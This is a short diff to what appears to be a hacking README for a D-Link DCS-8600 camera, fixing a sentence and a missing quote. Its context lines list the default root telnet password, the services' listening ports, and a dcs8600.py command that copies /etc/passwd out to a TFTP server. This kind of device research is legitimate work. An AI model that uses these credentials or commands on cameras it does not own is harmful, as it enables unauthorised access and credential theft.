@@ -34,7 +34,7 @@ or
 ```
 * telnet login: root:twipc
   
-* The key binaries are Rtk_MainProc, strmsrv, da_adaptor, cda, sa, StreamProxy all of none has released source code.
+* The key binaries are Rtk_MainProc, strmsrv, da_adaptor, cda, sa, StreamProxy - all with no released source code.
   * Rtk_MainProc listens on ports 80, 554, 443
   * da_adaptor listens on ports 8080, 8081
   * strmsrv listens on port 8088
@@ -65,7 +65,7 @@ or via telnet:
 ```
 * If telnet login is rejected, get the current passwd:
 ```
-  $ dcs8600.py 00:11:22:33:44:55 012345 --command "tftp -l /etc/passwd -r passwd -p ${TFTP_SERVER}
+  $ dcs8600.py 00:11:22:33:44:55 012345 --command "tftp -l /etc/passwd -r passwd -p ${TFTP_SERVER}"
 ```
 * There are traces of lighttpd configuration in /etc but there is no binary
 
